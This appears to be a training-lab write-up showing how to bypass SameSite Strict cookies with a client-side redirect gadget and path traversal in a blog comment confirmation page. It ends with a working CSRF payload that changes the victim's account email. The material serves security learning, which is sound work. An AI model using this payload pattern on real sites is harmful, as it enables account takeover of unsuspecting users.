# Lab: SameSite Strict bypass via client-side redirect

Like some previous labs, we firstly use Burp to catch the request /my-account/change-email. The difference is this lab has another parameter ``` submit=1 ```, so we
have to consider it when create the payload.
<img width="700" height="491" alt="image" src="https://github.com/user-attachments/assets/add79401-6c03-496e-848d-e1108a68aa60" />

The suggestion is about **gadgets**, so we can think about some javascript. To find them, we're going to post a comment in a blog. We'll see this request below:

<img width="724" height="430" alt="image" src="https://github.com/user-attachments/assets/faa55839-7778-41e4-bb00-59e8b95223ab" />

There is a piece of code which we can control the ``` postId ``` parameter.
```
redirectOnConfirmation = (blogPath) => { setTimeout(() => { const url = new URL(window.location); const postId = url.searchParams.get("postId"); window.location = blogPath + '/' + postId; }, 3000); }
```

The response is a page confirming that we posted our comment and later redirects back to the blog. To leverage this, we'll consider using path traversal. We can create a request like:
``` GET /post/comment/confirmation?postId=1/../../my-account```
and we'll see that it works, as the account page will be displayed. Therefore, we can use it to redirect to /my-account/change-email with the required parameters (email and submit).

## **Exploit payload**
```
<html>
  <body>
	<script>
		document.location = 'https://0ace006504d1c73f800f5dd000710039.web-security-academy.net/post/comment/confirmation?postId=5/../../my-account/change-email?email=pwned-by-me%40gmail.com%26submit=1';
	</script>
  </body>
</html>
```

